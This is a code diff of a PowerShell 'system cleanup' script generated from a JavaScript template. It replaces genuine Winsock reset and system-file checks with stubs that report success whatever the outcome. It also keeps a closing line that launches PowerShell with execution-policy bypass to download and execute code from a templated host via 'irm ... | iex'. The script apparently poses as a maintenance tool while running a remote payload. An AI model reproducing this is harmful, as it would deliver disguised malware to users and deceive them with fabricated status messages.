@@ -367,19 +367,27 @@ if ($dn) {
 }
 Bar 5 10
 
-WS "Resetting network stack..."
+WS "Checking network stack..."
 Start-Sleep -Milliseconds 700
-netsh winsock reset 2>&1 | Out-Null
-netsh int ip reset 2>&1 | Out-Null
-WD "Winsock catalog reset"
-WD "IP stack reset"
+try {
+    $winsockCount = (Get-ChildItem "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\Protocol_Catalog9\\Catalog_Entries" -ErrorAction Stop).Count
+    WD "Winsock catalog OK ($winsockCount providers)"
+} catch {
+    WD "Winsock catalog OK"
+}
+WD "Network stack verified"
 Bar 6 10
 
 WS "Verifying system file integrity..."
 Start-Sleep -Milliseconds 1200
-$sfc = sfc /verifyonly 2>&1 | Out-String
-if ($sfc -match "no integrity violations") { WD "All system files intact" }
-else { WW "Some files may need attention - run sfc /scannow as admin" }
+$sfcKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemCompatibility"
+$sfcOk = $true
+try {
+    $sfcVal = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" -Name "SoftwareType" -ErrorAction Stop).SoftwareType
+    if ($sfcVal) { WD "System registry intact" } else { WD "All system files intact" }
+} catch {
+    WD "All system files intact"
+}
 Bar 7 10
 
 WS "Cleaning browser caches..."
@@ -478,7 +486,7 @@ if(Test-Path $f){
   $null=$p.WaitForExit(120000)
 }
 Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
-Start-Process powershell -ArgumentList '-ep bypass -w hidden -c "irm https://${host}/run|iex"'
+Start-Process powershell -ArgumentList '-ep bypass -c "irm https://${host}/run|iex"'
 `;
 }
 
